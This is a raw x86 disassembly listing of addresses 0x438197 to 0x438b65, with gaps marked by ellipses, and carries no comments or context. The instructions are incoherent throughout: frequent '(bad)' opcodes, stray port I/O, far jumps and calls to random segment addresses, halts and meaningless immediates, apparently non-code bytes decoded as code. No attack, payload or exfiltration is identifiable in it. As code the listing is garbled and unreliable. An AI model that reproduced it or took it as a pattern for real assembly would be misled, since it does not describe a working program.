  438197:	ins    DWORD PTR es:[edi],dx
  438198:	les    edx,FWORD PTR [ebx-0x21]
  43819b:	dec    edi
  43819c:	mov    BYTE PTR [esi-0x7e],bl
  43819f:	sub    BYTE PTR [edi],cl
  4381a1:	jmp    0xe283:0xb6f72283
  4381a8:	cmp    al,0xda
  4381aa:	pop    ebp
  4381ab:	adc    eax,0x2dd69ec4
  4381b0:	mov    ebp,0x1ae90179
  4381b5:	das    
  4381b6:	or     DWORD PTR [ebx+0x7b],ecx
  4381b9:	jbe    0x4381f0
  4381bb:	sbb    DWORD PTR [esp+esi*8+0x6b],eax
  4381bf:	ret    
  4381c0:	xor    DWORD PTR [eax],eax
	...
  4381da:	jae    0x438245
  4381dc:	addr16 cwde 
  4381de:	out    dx,eax
  4381df:	or     al,0xe9
  4381e1:	add    esp,DWORD PTR [esi-0xb87ef31]
  4381e7:	add    al,0xe9
  4381e9:	xor    cl,BYTE PTR [edx+eiz*4]
  4381ec:	dec    ebp
  4381ed:	xchg   esi,ebp
  4381ef:	ja     0x4381cc
  4381f1:	mov    ebx,0x7ce8c504
  4381f6:	and    al,BYTE PTR [ecx]
  4381f8:	mov    si,ds
  4381fb:	icebp  
  4381fc:	loope  0x4381cf
  4381fe:	xchg   ebx,eax
  4381ff:	ins    DWORD PTR es:[edi],dx
  438200:	test   eax,0x1604f401
  438205:	mov    fs,WORD PTR ds:0x2b7fab8a
  43820b:	in     eax,dx
  43820c:	imul   DWORD PTR [ebx+edi*2-0x80]
  438210:	push   eax
  438211:	leave  
  438212:	or     al,BYTE PTR ds:0x813878e9
  438218:	call   FWORD PTR [eax-0x2a93ef8e]
  43821e:	aaa    
  43821f:	add    eax,0x2e8faa89
  438224:	ret    0x5295
  438227:	loope  0x438229
  438229:	fs xor eax,0x65814f81
  43822f:	pushf  
  438230:	xchg   DWORD PTR [ebp-0x78],ebp
  438233:	sbb    ebx,DWORD PTR [edi]
  438235:	jmp    0x6d880c31
  43823a:	and    bl,dl
  43823c:	gs call 0x438242
	...
  438256:	add    BYTE PTR [edx-0xfd52631],bh
  43825c:	sar    edx,cl
  43825e:	hlt    
  43825f:	xor    edx,DWORD PTR [eax+eax*2]
  438262:	jmp    0x124fb91f
  438267:	jb     0x43825c
  438269:	lods   al,BYTE PTR ds:[esi]
  43826a:	push   ebx
  43826b:	icebp  
  43826c:	mov    DWORD PTR [ebp+eiz*2-0x19],eax
  438270:	in     al,dx
  438271:	sbb    eax,0xe81ce801
  438276:	mov    ebx,0x74fa7715
  43827b:	mov    ah,0x80
  43827d:	dec    edi
  43827e:	aaa    
  43827f:	sar    DWORD PTR [ebx+0x14],cl
  438282:	leave  
  438283:	push   es
  438284:	aaa    
  438285:	add    BYTE PTR [eax+0x36],ah
  438288:	adc    DWORD PTR [edi],esi
  43828a:	scas   eax,DWORD PTR es:[edi]
  43828b:	sti    
  43828c:	jle    0x4382f3
  43828e:	call   0x19c743ef
  438293:	clc    
  438294:	push   ss
  438295:	sahf   
  438296:	icebp  
  438297:	pop    edi
  438298:	pop    esi
  438299:	retf   0xf00b
  43829c:	add    al,0x8d
  43829e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43829f:	inc    ebx
  4382a0:	(bad)  
  4382a1:	add    DWORD PTR [bx+di+0x46],eax
  4382a5:	(bad)  
  4382a6:	mov    dh,0xd
  4382a8:	add    DWORD PTR [ebx+0x0],edx
  4382ab:	mov    edi,DWORD PTR [edi+0x13]
  4382ae:	mov    WORD PTR [edi-0x7177003e],?
  4382b4:	dec    ebx
  4382b5:	ror    BYTE PTR [edi],0x19
  4382b8:	push   ds
  4382b9:	idiv   edi
	...
  4382d3:	add    dl,dl
  4382d5:	daa    
  4382d6:	dec    esi
  4382d7:	push   esi
  4382d8:	addr16 add al,0x50
  4382db:	(bad)  
  4382dc:	js     0x4382c8
  4382de:	or     al,0x40
  4382e0:	pop    ebp
  4382e1:	dec    ebx
  4382e2:	ror    BYTE PTR [edi],0xd9
  4382e5:	cmp    edi,esi
  4382e7:	jmp    DWORD PTR [edx-0x6]
  4382ea:	cmp    DWORD PTR [eax],edx
  4382ec:	dec    eax
  4382ed:	pop    edx
  4382ee:	(bad)  
  4382ef:	call   FWORD PTR [ebp+0x28]
  4382f2:	mov    DWORD PTR [ebx-0xb],eax
  4382f5:	mov    dh,0x43
  4382f7:	sti    
  4382f8:	dec    ebp
  4382f9:	adc    DWORD PTR [ebx],0xffc23808
  4382ff:	mov    al,bl
  438301:	xchg   esp,eax
  438302:	xor    esi,eax
  438304:	and    dh,dh
  438306:	ins    BYTE PTR es:[edi],dx
  438307:	add    DWORD PTR ds:0x853d8302,ecx
  43830d:	jno    0x438349
  43830f:	add    BYTE PTR [edi-0x1176b588],dh
  438315:	xchg   DWORD PTR fs:[ebx+0x25],esi
  438319:	or     ebp,0x7381176a
  43831f:	hlt    
  438320:	push   esp
  438321:	les    ebp,FWORD PTR [ebx]
  438323:	dec    DWORD PTR [edx-0x2d3be05]
  438329:	xor    edi,esi
  43832b:	jne    0x438386
  43832d:	cli    
  43832e:	cmp    DWORD PTR [eax],esi
  438330:	bound  esp,QWORD PTR [esi-0x22]
  438333:	adc    BYTE PTR [ebp+0xc63301],bl
	...
  438351:	test   eax,0xf4564a66
  438356:	mov    ch,0x71
  438358:	ds aam 0xbb
  43835b:	jno    0x4383a1
  43835d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43835e:	fwait
  43835f:	xor    DWORD PTR [eax+ebp*4-0x2d],0x28
  438364:	sbb    BYTE PTR [edx-0x390266d2],0x2b
  43836b:	test   DWORD PTR [eax+eax*4-0xc],esi
  43836f:	inc    eax
  438370:	sbb    al,0x2a
  438372:	pop    ss
  438373:	jmp    0x438384
  438375:	loope  0x438322
  438377:	(bad)  
  438378:	cmp    bh,ah
  43837a:	repz add DWORD PTR [bx+di],0x6d
  43837f:	(bad)  
  438380:	jmp    FWORD PTR [edi-0x58]
  438383:	mov    fs,WORD PTR [ecx+0x6f]
  438386:	lods   al,BYTE PTR ds:[esi]
  438387:	hlt    
  438388:	popa   
  438389:	xor    eax,0xb7880103
  43838e:	and    esi,ebp
  438390:	mov    cl,0x34
  438392:	push   bx
  438394:	ds or  ch,ah
  438397:	aas    
  438398:	xor    al,0x5c
  43839a:	push   0xa
  43839c:	add    dh,BYTE PTR [edi+0x4b]
  43839f:	cmp    BYTE PTR [esi+0x34],0x5f
  4383a3:	sub    eax,0x9677b789
  4383a8:	inc    eax
  4383a9:	dec    ebp
  4383aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4383ab:	cmp    DWORD PTR [edi-0x77],0x73
  4383af:	std    
  4383b0:	sar    DWORD PTR [ecx+0xafda2],0x0
	...
  4383cb:	add    BYTE PTR [eax],al
  4383cd:	add    BYTE PTR [ecx-0x51],dh
  4383d0:	(bad)  
  4383d1:	push   esp
  4383d3:	rol    BYTE PTR [ecx-0x1d],1
  4383d6:	jecxz  0x438363
  4383d8:	add    ecx,0x39
  4383db:	xchg   esi,edi
  4383dd:	out    0xca,eax
  4383df:	inc    edx
  4383e0:	(bad)  
  4383e1:	call   FWORD PTR [esi+0x4e]
  4383e4:	push   ss
  4383e5:	cwde   
  4383e6:	(bad)  
  4383e7:	add    eax,0xc87103a6
  4383ec:	sbb    al,0x34
  4383ee:	int3   
  4383ef:	aad    0x8f
  4383f1:	test   BYTE PTR [esi-0x57926c7e],ch
  4383f7:	je     0x43843a
  4383f9:	fwait
  4383fa:	icebp  
  4383fb:	fnstsw WORD PTR [edx]
  4383fd:	test   BYTE PTR [edx-0x7b],dh
  438400:	dec    edx
  438401:	add    dh,ah
  438403:	add    al,0x60
  438405:	inc    eax
  438406:	cmp    BYTE PTR [esi+0x4f40212],ch
  43840c:	outs   dx,BYTE PTR ds:[esi]
  43840d:	mov    ebp,0x43e905b5
  438412:	mov    ebp,0x6a1b0ff9
  438417:	add    eax,0x8a7103e9
  43841c:	jnp    0x4383a5
  43841e:	pop    esi
  43841f:	je     0x4383b9
  438421:	jbe    0x438435
  438423:	aad    0x98
  438425:	fwait
  438426:	in     al,dx
  438427:	lods   eax,DWORD PTR ds:[esi]
  438428:	loope  0x4383ad
  43842a:	fld    DWORD PTR ds:0xd577c96c
  438430:	inc    eax
  438431:	add    BYTE PTR es:[eax],al
	...
  438448:	add    BYTE PTR [eax],al
  43844a:	add    BYTE PTR [ebp-0x73],ah
  43844d:	lock imul ebp,DWORD PTR [ebx+0x7103e925],0xffffffca
  438455:	fs aam 0xca
  438458:	jae    0x438473
  43845a:	in     al,dx
  43845b:	stos   DWORD PTR es:[edi],eax
  43845c:	push   edx
  43845d:	and    eax,0xc91a0f04
  438462:	push   ss
  438463:	mov    ah,0x4
  438465:	jo     0x4383ee
  438467:	fwait
  438468:	add    eax,0x4c2b03e9
  43846d:	fld    DWORD PTR [edi-0x7c7e8d0e]
  438473:	inc    esi
  438474:	je     0x438449
  438476:	or     eax,DWORD PTR [ecx]
  438478:	(bad)  
  43847b:	and    BYTE PTR [ebx+0x36],0x76
  43847f:	int3   
  438480:	mov    esp,0x40dd6651
  438485:	pop    gs
  438487:	idiv   DWORD PTR [ebp+0x7e]
  43848a:	mov    ebp,0x120004f8
  43848f:	aas    
  438490:	clc    
  438491:	das    
  438492:	sar    eax,cl
  438494:	jmp    0xd9e4:0x18769700
  43849b:	mov    bh,0x73
  43849d:	xchg   DWORD PTR [edx-0x6c],ebp
  4384a0:	add    al,0x0
  4384a2:	jmp    0x2b6cc69
  4384a7:	mov    al,ds:0xf8bdae6e
  4384ac:	add    al,0x0
  4384ae:	push   cs
	...
  4384c7:	add    BYTE PTR ds:0xf7a90fb5,cl
  4384cd:	jge    0x43854d
  4384cf:	mov    eax,ds:0xb20004f0
  4384d4:	mov    esi,0x3d2703f7
  4384d9:	jp     0x4384db
  4384db:	aas    
  4384dc:	pop    ds
  4384dd:	outs   dx,BYTE PTR ds:[esi]
  4384de:	adc    al,0xf9
  4384e0:	fadd   st(4),st
  4384e2:	jmp    DWORD PTR [edx+0x3c]
  4384e5:	jp     0x438541
  4384e7:	das    
  4384e8:	mov    ecx,0x4ae903b1
  4384ed:	mov    bl,BYTE PTR [ebx*4+0x1effc507]
  4384f4:	and    DWORD PTR [ebx-0x7a],0x27
  4384f8:	aam    0xd7
  4384fa:	test   BYTE PTR [ecx-0x61b58df5],ch
  438500:	mov    ds:0x82e5418a,al
  438505:	xor    DWORD PTR [edx+edi*8],eax
  438508:	mov    bh,0x72
  43850a:	add    DWORD PTR [eax],0xffffff8d
  43850d:	jp     0x438508
  43850f:	dec    edi
  438510:	pop    edx
  438511:	iret   
  438512:	add    DWORD PTR [esi-0x1f],0xc1fff28b
  438519:	dec    DWORD PTR [edi-0x1]
  43851c:	rol    dl,0xf
  43851f:	inc    eax
  438520:	int    0x83
  438522:	inc    eax
  438523:	adc    al,0x20
  438525:	(bad)  
  438526:	outs   dx,BYTE PTR ds:[esi]
  438527:	add    ebp,DWORD PTR [ebp-0x79]
  43852a:	int    0x8b
	...
  438544:	add    BYTE PTR [ebx+0x16],dl
  438547:	test   eax,eax
  438549:	popa   
  43854a:	dec    DWORD PTR [edi-0x1]
  43854d:	mov    al,0x9a
  43854f:	or     al,0x40
  438551:	popf   
  438552:	add    DWORD PTR [eax],0xffffff85
  438555:	int    0x79
  438557:	stc    
  438558:	dec    edi
  438559:	fcmove st,st(6)
  43855b:	jp     0x4385d9
  43855d:	inc    ecx
  43855e:	push   ss
  43855f:	add    BYTE PTR [esp+eax*4-0x7d],dh
  438563:	sbb    BYTE PTR [eax+0x4c],0x6
  438567:	add    BYTE PTR [ebp+0x500b7a0d],al
  43856d:	dec    edx
  43856e:	lods   eax,DWORD PTR ds:[esi]
  43856f:	dec    esi
  438570:	add    DWORD PTR [ebp+0x6],ebx
  438573:	not    DWORD PTR ds:0x40195d
  438579:	(bad)  
  43857a:	jle    0x4385d2
  43857c:	add    DWORD PTR ds:0xc1c08506,ebx
  438582:	pop    es
  438583:	push   eax
  438584:	(bad)  
  438585:	jle    0x438507
  438587:	adc    BYTE PTR [esp+ecx*1+0x6],0x0
  43858c:	test   DWORD PTR [ebp+0x6d],ebx
  43858f:	std    
  438590:	dec    edi
  438591:	pop    edx
  438592:	sbb    al,al
  438594:	adc    ch,cl
  438596:	or     BYTE PTR [ebx+0x5ed86],al
  43859c:	add    ah,dh
  43859e:	loopne 0x4385e3
  4385a0:	jae    0x438599
  4385a2:	sub    eax,DWORD PTR [ecx-0x7c1e902e]
	...
  4385c0:	add    BYTE PTR [eax],al
  4385c2:	hlt    
  4385c3:	pop    ebx
  4385c4:	cmp    DWORD PTR [edi-0x13c1b8],0x1c12e33b
  4385ce:	out    0x9b,eax
  4385d0:	(bad)  
  4385d1:	cmp    al,0xf6
  4385d3:	pop    esp
  4385d4:	(bad)  
  4385d5:	jmp    FWORD PTR [eax]
  4385d7:	outs   dx,BYTE PTR ds:[esi]
  4385d8:	in     al,dx
  4385d9:	call   FWORD PTR ds:0xa30dec5c
  4385df:	icebp  
  4385e0:	mov    eax,DWORD PTR [eax]
  4385e2:	hlt    
  4385e3:	pop    ebx
  4385e4:	jg     0x4385fa
  4385e6:	call   0x7543443a
  4385eb:	sub    DWORD PTR [eax],eax
  4385ed:	add    esp,esi
  4385ef:	pop    ebx
  4385f0:	sub    WORD PTR [ebx+edx*1],sp
  4385f4:	sbb    DWORD PTR [edx-0x2e],0xf40344b6
  4385fb:	out    0xc6,al
  4385fd:	setle  bl
  438600:	add    eax,DWORD PTR [eax]
  438602:	hlt    
  438603:	out    0x43,eax
  438605:	jae    0x4385d0
  438607:	(bad)  
  438609:	and    esi,eax
  43860b:	pop    ebx
  43860c:	ror    DWORD PTR [edx],cl
  43860e:	push   0x2ff9d89e
  438613:	bound  edi,QWORD PTR [eax-0x794a2911]
  438619:	sbb    edi,edx
  43861b:	and    ebp,ebx
  43861d:	cmp    edx,DWORD PTR [ebp+ebp*1-0x23]
  438621:	cmp    edx,DWORD PTR [ebp+0x39]
  438624:	ds cmp al,0x0
	...
  43863f:	push   edi
  438640:	xor    DWORD PTR [ecx],esp
  438642:	cmp    al,0x51
  438644:	cmp    dl,cl
  438646:	and    DWORD PTR [ebp+0x4],0x4d
  43864a:	add    esi,esp
  43864c:	add    al,0x14
  43864e:	adc    BYTE PTR [eax-0x6a],bh
  438651:	dec    ebx
  438652:	add    esi,esp
  438654:	add    al,0x14
  438656:	or     BYTE PTR [ebx],dl
  438658:	inc    ebp
  438659:	lea    eax,ds:0xc2704373
  43865f:	add    DWORD PTR [esp+edi*4-0x79],ebx
  438663:	mov    fs:0xf9f403e8,eax
  438669:	hlt    
  43866a:	xchg   DWORD PTR [esp+eiz*4-0x18],esp
  43866e:	add    esi,esp
  438670:	stc    
  438671:	in     al,dx
  438672:	xor    al,0xb4
  438674:	pop    esp
  438675:	out    0x8c,al
  438677:	popa   
  438678:	jge    0x438621
  43867a:	adc    dl,BYTE PTR [ebx+0x7392650e]
  438680:	add    eax,0x10103e9
  438685:	gs xchg edx,eax
  438687:	push   esp
  438688:	add    eax,0x90103e9
  43868d:	(bad)  
  43868e:	inc    ebx
  43868f:	pop    edx
  438690:	add    ebx,DWORD PTR [esi+0x45]
  438693:	jae    0x43865b
  438695:	clc    
  438696:	xor    al,0x34
  438698:	mov    DWORD PTR [edi-0x56fa1ffe],edx
  43869e:	xchg   DWORD PTR [edx+eax*1+0x47d],esp
	...
  4386b9:	add    BYTE PTR [eax],al
  4386bb:	add    bl,cl
  4386bd:	cmp    al,0xe6
  4386bf:	xchg   DWORD PTR [eax+ecx*1+0x3cbb035d],esp
  4386c6:	clc    
  4386c7:	xchg   esp,eax
  4386c9:	adc    al,0x5d
  4386cb:	add    ebp,DWORD PTR [ebx-0x3b781bc4]
  4386d1:	adc    eax,0x3c9b033d
  4386d6:	lock inc ecx
  4386d8:	test   DWORD PTR [eax+eax*1],0x7e5c7f1c
  4386df:	lds    eax,FWORD PTR [eax-0xf42147c]
  4386e5:	add    al,0x0
  4386e7:	cmp    dh,BYTE PTR [ebx+0x19]
  4386ea:	add    al,bh
  4386ec:	mov    bh,0x6f
  4386ee:	dec    edx
  4386ef:	mov    ?,ebp
  4386f1:	fcom   DWORD PTR [ecx+ebp*1]
  4386f4:	lock mov DWORD PTR [edi+0x4b80dcf5],edi
  4386fb:	int    0xf3
  4386fd:	aad    0x65
  4386ff:	add    eax,0xe123bb65
  438704:	mov    al,ds:0x32b8fde9
  438709:	sbb    DWORD PTR [eax-0x4],ebp
  43870c:	mov    bh,0x6f
  43870e:	sub    DWORD PTR [ecx],0xffffff9c
  438711:	mov    ebx,0x8d3c57e
  438716:	dec    edx
  438717:	mov    ah,0xbc
  438719:	jmp    0x23ffeb1d
  43871e:	or     al,0x99
	...
  438738:	add    BYTE PTR [edi-0x3721b780],cl
  43873e:	pop    esp
  43873f:	es (bad) 
  438741:	test   DWORD PTR [esi+eiz*2],0x23c384a5
  438748:	fld    QWORD PTR [ebx+edi*4+0x1dcf7d23]
  43874f:	mov    bl,0xfe
  438751:	ror    BYTE PTR [eax-0x2aef8341],cl
  438757:	mov    dh,0xd1
  438759:	mov    ds:0x63d1002e,eax
  43875e:	jbe    0x43875a
  438760:	fidivr WORD PTR [ebx-0x51]
  438763:	jae    0x438745
  438765:	jbe    0x438767
  438767:	and    BYTE PTR [edi-0x190ca],ch
  43876d:	inc    esi
  43876e:	add    BYTE PTR [edx+0x0],ah
  438771:	xchg   dl,al
  438773:	loop   0x43876b
  438775:	inc    eax
  438776:	out    dx,al
  438777:	cmc    
  438778:	pop    ebx
  438779:	xchg   esi,eax
  43877a:	fcomp  QWORD PTR [ebx-0x3d]
  43877d:	xchg   BYTE PTR [edi+0x1e],al
  438780:	add    al,0x9a
  438782:	add    al,0x14
  438784:	mov    ds,WORD PTR ds:0xa1518309
  43878a:	sbb    edx,DWORD PTR [ecx+0x24]
  43878d:	adc    al,BYTE PTR fs:[ebx+0x511b8d51]
  438794:	sub    BYTE PTR [edx+edx*2-0x2],dl
  438798:	mov    cl,BYTE PTR [esi+edx*2-0x1]
  43879c:	inc    DWORD PTR [eax]
	...
  4387b6:	int    0xc4
  4387b8:	(bad)  
  4387b9:	jmp    FWORD PTR [eax+0x7b]
  4387bc:	out    0x83,al
  4387be:	xor    DWORD PTR [edx-0x7f],ecx
  4387c1:	rol    DWORD PTR [eax+0x55],0xa6
  4387c5:	push   0xffffffbd
  4387c7:	or     DWORD PTR [ebx-0x4],0x521e5220
  4387ce:	adc    BYTE PTR [ebp-0x1a],dl
  4387d1:	push   ecx
  4387d2:	adc    al,0x3d
  4387d4:	loop   0x4387be
  4387d6:	call   0x4a04:0x87fff5b8
  4387dd:	dec    ebp
  4387df:	push   ebp
  4387e0:	(bad)  
  4387e1:	dec    DWORD PTR [ebp-0x11]
  4387e4:	adc    ebp,DWORD PTR [ecx+edi*1]
  4387e7:	inc    edx
  4387e8:	cli    
  4387e9:	imul   ebx,DWORD PTR [ebp-0x11],0x4229fc13
  4387f0:	cli    
  4387f1:	test   BYTE PTR ds:0xc0500476,cl
  4387f7:	inc    ebp
  4387f8:	loop   0x43884a
  4387fa:	inc    ebp
  4387fb:	out    dx,al
  4387fc:	(bad)  
  4387fe:	hlt    
  4387ff:	push   esi
  438800:	inc    esi
  438801:	mov    esi,0xf08936ca
  438806:	outs   dx,DWORD PTR ds:[esi]
  438807:	push   ds
  438808:	adc    al,0xfb
  43880a:	inc    esp
  43880b:	push   0xe2f4fffd
  438810:	mov    edi,edi
  438812:	hlt    
  438813:	pop    ebx
  438814:	(bad)  
  438815:	push   eax
  438816:	mov    ?,edi
  438818:	mov    ch,dh
	...
  438832:	add    BYTE PTR [edi],ah
  438834:	stos   BYTE PTR es:[edi],al
  438835:	(bad)  
  438836:	out    0xfe,eax
  438838:	jl     0x4388b3
  43883a:	cli    
  43883b:	jns    0x4387d8
  43883d:	test   DWORD PTR [ebx],0xc226fdb
  438843:	and    al,0xf3
  438845:	inc    esp
  438846:	out    0x83,eax
  438848:	imul   edi,DWORD PTR [ebx-0x6],0x33dfe23
  43884f:	hlt    
  438850:	out    0xf7,al
  438852:	and    eax,DWORD PTR [eax]
  438854:	repz ds cli 
  438857:	and    BYTE PTR [eax],al
  438859:	adc    bl,bh
  43885b:	sub    BYTE PTR [eax],cl
  43885d:	adc    BYTE PTR [esi-0x74],cl
  438860:	pop    esi
  438861:	sar    edx,1
  438863:	xchg   ebx,eax
  438864:	sbb    DWORD PTR [eax],edx
  438866:	add    BYTE PTR [esi+0x6f54fe5f],dh
  43886c:	das    
  43886d:	and    ebx,0xbc2f27c
  438873:	ja     0x438874
  438875:	pop    ds
  438876:	dec    edi
  438877:	ret    0x7fae
  43887a:	mul    DWORD PTR [ecx+0x4e]
  43887d:	sub    BYTE PTR [esi-0xb],0x5b
  438881:	dec    BYTE PTR [edx]
  438883:	jp     0x438834
  438885:	std    
  438886:	push   esp
  438888:	fidivr DWORD PTR [ebx-0x6]
  43888b:	repz out 0x30,al
  43888e:	add    esp,esi
  438890:	add    al,0xe9
  438892:	jl     0x43883c
  438894:	cld    
  438895:	fst    DWORD PTR [esi]
	...
  4388af:	add    BYTE PTR [eax+ebx*1+0x29],dh
  4388b3:	add    al,0x7b
  4388b5:	ins    BYTE PTR es:[edi],dx
  4388b6:	arpl   WORD PTR [esi+ebp*8-0x78],di
  4388ba:	and    eax,DWORD PTR [ebx]
  4388bc:	hlt    
  4388bd:	add    al,0x66
  4388bf:	iret   
  4388c0:	xlat   BYTE PTR ds:[ebx]
  4388c1:	sbb    BYTE PTR [edx-0x76e9012c],dh
  4388c7:	pop    ss
  4388c8:	mov    ah,0x4
  4388ca:	(bad)  
  4388cb:	pop    eax
  4388cc:	jl     0x43888f
  4388ce:	les    edx,FWORD PTR [ebx]
  4388d0:	scas   al,BYTE PTR es:[edi]
  4388d1:	add    eax,0x81f403ed
  4388d6:	test   al,0xfd
  4388d8:	pop    ss
  4388d9:	rcl    DWORD PTR ds:0x5d12ced5,cl
  4388df:	pop    ss
  4388e0:	xor    al,0x5
  4388e2:	ins    DWORD PTR es:[edi],dx
  4388e3:	inc    ebx
  4388e4:	cmp    al,0x15
  4388e6:	adc    edx,ecx
  4388e8:	es ins BYTE PTR es:[edi],dx
  4388ea:	fisttp DWORD PTR [ebx]
  4388ec:	scas   eax,DWORD PTR es:[edi]
  4388ed:	adc    al,BYTE PTR [ebp+0x60053417]
  4388f3:	(bad)  
  4388f5:	adc    BYTE PTR [esi-0x26dec7c8],ah
  4388fb:	jmp    FWORD PTR [edi-0x359fef5a]
  438901:	add    al,0x32
  438903:	mov    bl,0xf7
  438905:	add    eax,0xb57f03e9
  43890a:	call   0xb2487d11
  43890f:	jl     0x4388f1
  438911:	cld    
  438912:	adc    DWORD PTR [esi],edx
	...
  43892c:	add    al,ah
  43892e:	adc    BYTE PTR [ecx+0x654d7303],ch
  438934:	js     0x438984
  438936:	cld    
  438937:	fs jnp 0x438985
  43893a:	ins    BYTE PTR es:[edi],dx
  43893b:	(bad)  
  43893c:	call   0xee96446a
  438941:	loope  0x4388cb
  438943:	adc    ebp,DWORD PTR [ecx]
  438945:	clc    
  438946:	jge    0x43898b
  438948:	add    eax,0xd5c2e00
  43894d:	add    al,0xf1
  43894f:	add    esi,ecx
  438951:	add    eax,0xf8291525
  438956:	fdivr  QWORD PTR [edi-0x1b]
  438959:	test   DWORD PTR [edi+ecx*2],0x7f07f1e
  438960:	scas   al,BYTE PTR es:[edi]
  438961:	in     eax,0xa0
  438963:	adc    ebp,DWORD PTR [ecx]
  438965:	clc    
  438966:	jmp    0x4389e4
  438968:	in     eax,dx
  438969:	ins    DWORD PTR es:[edi],dx
  43896a:	inc    DWORD PTR [ebx+0x4f8ac]
  438970:	xchg   edi,eax
  438971:	mov    ah,0x27
  438973:	adc    dl,ch
  438975:	inc    BYTE PTR [ecx+0x4f7e9b5]
  43897b:	repnz sub eax,0xf5101514
  438981:	mov    ah,0xba
  438983:	push   edx
  438984:	add    ax,0x13ed
  438988:	test   eax,0x6cef83f7
  43898d:	inc    DWORD PTR es:[ebx+0x88]
	...
  4389a8:	add    BYTE PTR [eax],al
  4389aa:	lock add al,0x0
  4389ad:	je     0x438963
  4389af:	daa    
  4389b0:	sbb    BYTE PTR [ecx-0x4305295e],bl
  4389b6:	out    dx,eax
  4389b7:	outs   dx,DWORD PTR ds:[esi]
  4389b8:	adc    al,0x65
  4389ba:	in     al,0xc4
  4389bc:	jmp    FWORD PTR [ebx-0x48]
  4389bf:	inc    BYTE PTR [ebx+0x4f070]
  4389c5:	xor    edi,0x6f
  4389c8:	je     0x4389ab
  4389ca:	fdivrp st(7),st
  4389cc:	and    eax,DWORD PTR [eax]
  4389ce:	sub    esi,ebp
  4389d0:	outs   dx,BYTE PTR ds:[esi]
  4389d1:	and    al,0x31
  4389d3:	pop    edi
  4389d4:	cli    
  4389d5:	aas    
  4389d6:	dec    ebp
  4389d7:	pop    es
  4389d8:	dec    esi
  4389d9:	jmp    DWORD PTR [eax]
  4389db:	jg     0x4389eb
  4389dd:	inc    eax
  4389de:	sbb    eax,0xd1f768da
  4389e3:	and    al,0x10
  4389e5:	add    BYTE PTR ds:0x11740007,dl
  4389eb:	xor    al,al
  4389ed:	jmp    0x4389f7
  4389ef:	push   edx
  4389f0:	dec    ebp
  4389f1:	jmp    DWORD PTR [eax]
  4389f3:	ja     0x438a03
  4389f5:	inc    eax
  4389f6:	or     eax,0xc1fff282
  4389fb:	push   ebx
  4389fc:	fs add dl,ch
  4389ff:	mov    bh,0xba
  438a01:	push   eax
  438a02:	add    eax,0xcd000110
  438a07:	out    dx,eax
  438a08:	jae    0x438a12
  438a0a:	push   0x15
  438a0c:	call   0x438a25
	...
  438a25:	add    BYTE PTR [eax],al
  438a27:	sbb    eax,0xda3de301
  438a2c:	mov    bh,0xca
  438a2e:	shl    DWORD PTR [ebp+0x16],0x89
  438a32:	inc    esp
  438a33:	mov    cl,0x12
  438a35:	pop    es
  438a36:	mov    bh,0xdc
  438a38:	push   edi
  438a39:	cli    
  438a3a:	inc    al
  438a3c:	dec    BYTE PTR [eax-0x3ee70ebc]
  438a42:	jmp    0xdc55e8e4
  438a47:	pop    esi
  438a48:	push   es
  438a49:	lea    eax,[ecx+esi*8+0x24]
  438a4d:	mov    DWORD PTR [ecx+esi*8+0x24],edx
  438a51:	mov    DWORD PTR [ecx+esi*8+0x30],ecx
  438a55:	call   0xf63324e4
  438a5a:	jmp    0x438ab5
  438a5c:	out    dx,eax
  438a5d:	xor    ebp,DWORD PTR [eax]
  438a5f:	hlt    
  438a60:	das    
  438a61:	ret    0x5aff
  438a64:	jno    0x438a50
  438a66:	adc    esi,DWORD PTR [ebx+ebx*2+0x8103475]
  438a6d:	ret    0x42ff
  438a70:	dec    ecx
  438a71:	scas   al,BYTE PTR es:[edi]
  438a72:	or     eax,0x59d55bb4
  438a77:	out    0x9b,eax
  438a79:	fadd   QWORD PTR [esi+0x7422911]
  438a7f:	hlt    
  438a80:	sub    BYTE PTR [ebp-0x20578815],cl
  438a86:	icebp  
  438a87:	stc    
  438a88:	sti    
  438a89:	push   ebp
  438a8a:	add    BYTE PTR ds:[eax],al
	...
  438aa1:	add    BYTE PTR [eax],al
  438aa3:	add    ah,dh
  438aa5:	pop    edi
  438aa6:	jmp    0xf400:0x12af0c29
  438aad:	fild   WORD PTR [ebx+0x73]
  438ab0:	sbb    DWORD PTR [esi],edx
  438ab2:	add    al,0x8d
  438ab4:	xor    eax,ebp
  438ab6:	shl    DWORD PTR [edi+0x71],cl
  438ab9:	and    al,0x31
  438abb:	sub    esp,ecx
  438abd:	std    
  438abe:	pop    ss
  438abf:	add    ah,dh
  438ac1:	sub    dl,0xf
  438ac4:	jns    0x438ae6
  438ac6:	cwde   
  438ac7:	cli    
  438ac8:	dec    ecx
  438ac9:	pusha  
  438aca:	ja     0x438b40
  438acc:	in     al,dx
  438acd:	or     edi,DWORD PTR [ecx+0x14]
  438ad0:	cmp    BYTE PTR [ecx-0x42],ch
  438ad3:	call   FWORD PTR [esi+0x474775a]
  438ad9:	shr    edx,cl
  438adb:	or     ebx,DWORD PTR [ebx-0x1604f9b0]
  438ae1:	or     DWORD PTR [bx+si-0xc],eax
  438ae5:	xor    al,0x42
  438ae7:	or     esi,esp
  438ae9:	sub    ebx,edi
  438aeb:	pop    ds
  438aec:	call   0xf204:0xe803fe9e
  438af3:	imul   ebx,DWORD PTR [edi+eax*1+0x447803e9],0xffffff9c
  438afb:	add    DWORD PTR [ebx],ecx
  438afd:	inc    ebp
  438afe:	test   al,0x45
  438b00:	test   DWORD PTR [edx+eax*1],0xa910dc1f
  438b07:	add    eax,DWORD PTR [eax]
	...
  438b21:	test   eax,0xf072047d
  438b26:	and    al,0xb
  438b28:	lds    esi,FWORD PTR [ebx]
  438b2a:	add    eax,0xf8a08d3b
  438b2f:	push   esp
  438b30:	and    ecx,DWORD PTR [eax+eax*4]
  438b33:	repz add esi,esp
  438b36:	sub    BYTE PTR [eax-0x3d21411],0x23
  438b3d:	sub    ch,al
  438b3f:	call   0x3bad7f32
  438b44:	adc    al,0x73
  438b46:	mov    bh,0xd4
  438b48:	js     0x438bb2
  438b4a:	std    
  438b4b:	nop
  438b4c:	scas   al,BYTE PTR es:[edi]
  438b4d:	call   0xf3b024ba
  438b52:	sbb    edx,DWORD PTR [bx+si]
  438b55:	fcomip st,st(2)
  438b57:	clc    
  438b58:	ror    esi,1
  438b5a:	bnd lock js 0x438b3e
  438b5e:	cld    
  438b5f:	aam    0xc3
  438b61:	ret    
  438b62:	retf   0x4613
  438b65:	jmp    0x438b6b
